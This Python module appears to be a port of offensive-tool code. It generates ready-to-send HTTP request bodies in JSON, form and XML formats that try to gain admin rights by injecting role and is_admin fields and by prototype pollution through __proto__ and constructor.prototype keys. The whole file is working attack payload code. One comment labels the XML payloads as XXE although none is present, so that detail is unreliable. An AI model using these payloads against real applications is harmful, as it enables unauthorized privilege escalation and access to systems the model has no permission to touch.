#!/usr/bin/env python3
"""
## Source: Forbidra internal/payloads/body.go (JSON privilege escalation)
## Source: Forbidra internal/payloads/form.go (form privilege escalation)
## Source: gobypass403 core/engine/payload/body.go (prototype pollution payloads)
## License: MIT (Forbidra, gobypass403)
## Port: 2026-09-05

Body-level privilege escalation + prototype pollution.

Three encodings (JSON, form-urlencoded, XML) get three bypass patterns:

  1. ``role`` / ``is_admin`` field -- the canonical privilege escalation.
  2. ``__proto__`` / ``constructor.prototype`` -- prototype pollution
     that re-defines Object at the server's eval-time, granting admin.
  3. ``constructor``-key inheritance -- a bypass that works on certain
     Node.js parsers even when ``__proto__`` is sanitized.

The class emits *bodies* (not URLs); the HTTP lane pairs each body with
the appropriate ``Content-Type`` header.
"""

from __future__ import annotations

from typing import Dict, List


class BodyBypass:
    """Body-level privilege escalation payloads.

    Emits ready-to-send request bodies for JSON, form-urlencoded, and
    XML endpoints. Each body contains at least the privilege-escalation
    fields plus one prototype-pollution vector.
    """

    JSON_PAYLOADS: List[Dict[str, object]] = [
        {"role": "admin"},
        {"role": "admin", "is_admin": True},
        {"admin": True, "__proto__": {"admin": True}},
        {"constructor": {"prototype": {"admin": True}}},
        {"__proto__": {"isAdmin": True, "role": "admin"}},
    ]

    FORM_PAYLOADS: List[Dict[str, str]] = [
        {"role": "admin"},
        {"role": "admin", "is_admin": "1"},
        {"__proto__[admin]": "1"},
        {"constructor[prototype][admin]": "1"},
    ]

    XML_PAYLOADS: List[str] = [
        # XXE + privilege escalation, defensive DOCTYPE-less version first
        '<user><role>admin</role></user>',
        '<user><role>admin</role><__proto__><admin>true</admin></__proto__></user>',
        '<user><constructor><prototype><admin>true</admin></prototype></constructor></user>',
    ]

    def json_bodies(self) -> List[Dict[str, object]]:
        return [dict(p) for p in self.JSON_PAYLOADS]

    def form_bodies(self) -> List[Dict[str, str]]:
        return [dict(p) for p in self.FORM_PAYLOADS]

    def xml_bodies(self) -> List[str]:
        return list(self.XML_PAYLOADS)

    def payloads(self, content_type: str = "json") -> List[Dict[str, str]]:
        """Return ``[{"content_type": ..., "body": ...}, ...]``.

        ``content_type`` accepts ``"json"``, ``"form"``, or ``"xml"``.
        """
        ct = content_type.lower()
        if ct == "json":
            import json as _json
            return [
                {"content_type": "application/json",
                 "body": _json.dumps(b)}
                for b in self.JSON_PAYLOADS
            ]
        if ct in ("form", "form-urlencoded"):
            from urllib.parse import urlencode
            return [
                {"content_type": "application/x-www-form-urlencoded",
                 "body": urlencode(b)}
                for b in self.FORM_PAYLOADS
            ]
        if ct == "xml":
            return [
                {"content_type": "application/xml", "body": b}
                for b in self.XML_PAYLOADS
            ]
        raise ValueError(
            f"content_type must be json|form|xml, got {content_type!r}"
        )

    def name(self) -> str:
        return "body_bypass"

    def technique(self) -> str:
        return "Body privilege escalation + prototype pollution"